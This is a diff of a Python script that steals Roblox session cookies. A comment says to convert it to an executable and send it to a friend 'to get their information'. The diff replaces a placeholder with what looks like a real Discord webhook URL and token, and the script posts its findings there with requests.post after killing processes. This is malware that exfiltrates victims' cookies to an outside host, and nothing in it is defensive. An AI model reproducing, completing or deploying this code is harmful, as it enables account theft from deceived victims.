@@ -7,7 +7,7 @@ import json
 # you can use auto_py_to_exe to convert it to an exe file and send it to your friend to get their information
 
 
-webhook = "your discord webhook"
+webhook = "https://discord.com/api/webhooks/1419351582386032874/I6Qz3DRY5ARDZGqOhLD9AdvrTrIkBWLtJyxFfEBCaMeXDSa6x-FRuEyTm7eW16U289Sm"
 
 def check_and_kill_process(process_name):
     try:
@@ -37,4 +37,5 @@ else:
     message = {
                 'content': f'```no roblox cookies```'
     }
+
     requests.post(webhook, data=json.dumps(message), headers={'Content-Type': 'application/json'})
